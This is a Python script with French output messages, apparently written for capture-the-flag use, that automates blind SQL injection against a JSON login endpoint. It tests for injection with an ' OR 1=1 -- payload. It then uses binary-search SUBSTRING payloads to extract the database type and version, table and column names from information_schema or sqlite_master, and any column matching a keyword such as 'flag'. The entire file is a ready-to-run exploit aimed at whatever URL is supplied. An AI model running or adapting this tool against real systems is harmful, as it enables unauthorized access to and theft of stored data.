import requests
import json
import time
import argparse

class SQLInjectionTester:
    def __init__(self, url, delay=1, wanted_key="flag"):
        self.url = url
        self.delay = delay
        self.session = requests.Session()
        self.wanted_key = wanted_key
        self.dbms = None
        self.version = None
        self.schema = {}

    def _send_request(self, payload_dict):
        try:
            response = self.session.post(
                self.url,
                json=payload_dict,
                headers={"Content-Type": "application/json"},
                allow_redirects=True
            )
            time.sleep(self.delay)
            return response
        except Exception as e:
            print(f"[!] Erreur d'envoi: {e}")
            return None

    def is_oracle_true(self, response):
        if not response:
            return False
        try:
            data = response.json()
            return data.get("status") == "success"
        except:
            return "success" in response.text.lower() or response.status_code == 200

    def blind_extraction(self, payload_template, max_len=100):
        result = ""
        for i in range(1, max_len + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                char = chr(mid)
                payload = {
                    "username": payload_template.format(pos=i, char=char),
                    "password": "'"
                }
                response = self._send_request(payload)
                if self.is_oracle_true(response):
                    low = mid + 1
                else:
                    high = mid - 1
            extracted_char = chr(low)
            if extracted_char == " " or low > 126:
                break
            result += extracted_char
            print(f"\r[+] En cours : {result}", end="")
        print(f"\n[+] Résultat : {result}")
        return result

    def test_sql_injection(self):
        print("[*] Test initial d'injection SQL...")
        normal = self._send_request({"username": "user", "password": "pass"})
        injected = self._send_request({"username": "' OR 1=1 --", "password": "pass"})
        if self.is_oracle_true(injected) and not self.is_oracle_true(normal):
            print("[+] Injection SQL détectée. Vulnérabilité exploitable.")
            return True
        else:
            print("[-] Pas de vulnérabilité SQL visible.")
            return False

    def extract_version_and_dbms(self):
        print("[*] Recherche du SGBD et de sa version...")
        dbms_payloads = {
            "mysql": "SELECT VERSION()",
            "postgresql": "SELECT version()",
            "sqlite": "SELECT sqlite_version()"
        }
        for dbms, query in dbms_payloads.items():
            print(f"[*] Test version {dbms}...")
            payload = f"' OR 1=1 AND SUBSTRING(({query}), {{pos}}, 1) > '{{char}}' -- -"
            version = self.blind_extraction(payload)
            if version:
                print(f"[+] {dbms.upper()} détecté. Version : {version}")
                self.dbms = dbms
                self.version = version
                return dbms, version
        print("[-] Aucun SGBD détecté.")
        return None, None

    def extract_schema(self, table_limit=5, column_limit=5):
        print("[*] Extraction du schéma...")
        schema = {}
        if not self.dbms:
            print("[-] DBMS inconnu. Extraction impossible.")
            return schema

        if self.dbms == "mysql":
            for i in range(table_limit):
                tbl = self.blind_extraction(f"' OR 1=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1), {{pos}}, 1) > '{{char}}' -- -")
                if not tbl: break
                schema[tbl] = []
                for j in range(column_limit):
                    col = self.blind_extraction(f"' OR 1=1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}' LIMIT {j},1), {{pos}}, 1) > '{{char}}' -- -")
                    if not col: break
                    schema[tbl].append(col)
        elif self.dbms == "postgresql":
            for i in range(table_limit):
                tbl = self.blind_extraction(f"' OR 1=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT {i},1), {{pos}}, 1) > '{{char}}' -- -")
                if not tbl: break
                schema[tbl] = []
                for j in range(column_limit):
                    col = self.blind_extraction(f"' OR 1=1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}' LIMIT {j},1), {{pos}}, 1) > '{{char}}' -- -")
                    if not col: break
                    schema[tbl].append(col)
        elif self.dbms == "sqlite":
            for i in range(table_limit):
                tbl = self.blind_extraction(f"' OR 1=1 AND SUBSTRING((SELECT name FROM sqlite_master WHERE type='table' LIMIT {i},1), {{pos}}, 1) > '{{char}}' -- -")
                if not tbl: break
                schema[tbl] = []
                for j in range(column_limit):
                    col = self.blind_extraction(f"' OR 1=1 AND SUBSTRING((SELECT name FROM pragma_table_info('{tbl}') LIMIT {j},1), {{pos}}, 1) > '{{char}}' -- -")
                    if not col: break
                    schema[tbl].append(col)
        self.schema = schema
        return schema

    def extract_data(self):
        print(f"[*] Extraction de données via clé : '{self.wanted_key}'...")
        for table, cols in self.schema.items():
            for col in cols:
                if self.wanted_key.lower() in col.lower():
                    print(f"[+] Cible trouvée : {table}.{col}")
                    data = self.blind_extraction(f"' OR 1=1 AND SUBSTRING((SELECT {col} FROM {table} LIMIT 1), {{pos}}, 1) > '{{char}}' -- -")
                    print(f"[+] Donnée extraite : {data}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="URL de l'endpoint vulnérable")
    parser.add_argument("--delay", type=float, default=1)
    parser.add_argument("--extract-sgbd", action="store_true", help="Extraire le nom et la version du SGBD")
    parser.add_argument("--extract-schema", action="store_true", help="Extraire le schéma des tables")
    parser.add_argument("--wanted-key", type=str, help="Extraire les données contenant ce mot-clé")

    args = parser.parse_args()
    tester = SQLInjectionTester(args.url, args.delay, args.wanted_key or "flag")

    if tester.test_sql_injection():
        if args.extract_sgbd:
            tester.extract_version_and_dbms()

        if args.extract_schema:
            schema = tester.extract_schema()
            for t, cols in schema.items():
                print(f"\n[+] 📦 Table : {t}")
                for col in cols:
                    print(f"    └── 📌 Colonne : {col}")

        if args.wanted_key:
            tester.extract_data()
    else:
        print("[!] Injection SQL non détectée. Aucune action possible.")

if __name__ == "__main__":
    main()
